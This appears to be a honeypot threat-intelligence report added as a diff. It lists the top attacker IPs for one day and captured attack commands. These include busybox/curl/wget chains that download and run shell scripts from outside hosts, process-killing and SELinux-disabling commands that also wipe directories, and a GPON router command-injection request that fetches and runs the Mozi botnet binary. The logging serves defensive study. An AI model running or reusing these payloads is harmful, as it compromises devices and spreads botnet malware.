@@ -1,0 +1,23 @@
+Top 5 IPs for 2024-03-11 :
+
+122.226.191.252
+137.184.170.19
+103.83.12.2
+123.185.88.203
+110.178.78.57
+
+Malcious Commands seen:
+
+cd /data/local/tmp/; busybox wget http://103.173.255.143/w.sh; sh w.sh; curl http://103.173.255.143/c.sh; sh c.sh; wget http://103.173.255.143/wget.sh; sh wget.sh; curl http://103.173.255.143/wget.sh; sh wget.sh; busybox wget http://103.173.255.143/wget.sh; sh wget.sh; busybox curl http://103.173.255.143/wget.sh; sh wget.sh
+
+toybox top -b -n 1 | awk '$9 > 20 {print $1}' | toybox xargs kill -9;toybox top -b -n 1 | awk '$9 > 20 {print $1}' | su 0 toybox xargs kill -9;toybox pkill -9 M;toybox pkill -9 arm;toybox pkill -9 arm7;toybox pkill -9 x86;toybox pkill -9 x86_64;su 0 toybox pkill -9 arm;su 0 toybox pkill -9 arm7;su 0 toybox pkill -9 x86;su 0 toybox pkill -9 x86_64;su 0 rm -rf /data/local;su 0 mkdir /data/local/;su 0 mkdir /data/local/tmp;su 0 chmod 777 /data/local;su 0 chmod 777 /data/local/tmp;chmod 777 /data/local/tmp; cd /data/local/tmp || cd /data/local/.most || cd /data/local/most; rm -rf *;setenforce 0;busybox wget http://103.67.197.185/and || su 0 busybox wget http://103.67.197.185/and;chmod 777 and || su 0 chmod 777 and;sh and;su 0 mv /data/local/tmp /data/local/.most;su 0 chmod 777 /data/local;su 0 echo hacker > /data/local/tmp;su 0 chmod 444 /data/local;ulimit 999999
+
+POST /GponForm/diag_Form?images/ HTTP/1.1
+Host: 127.0.0.1:8080
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: Hello, World
+Content-Length: 118
+
+XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://61.52.156.156:58542/Mozi.m+-O+->/tmp/gpon8080;sh+/tmp/gpon8080&ipv=0
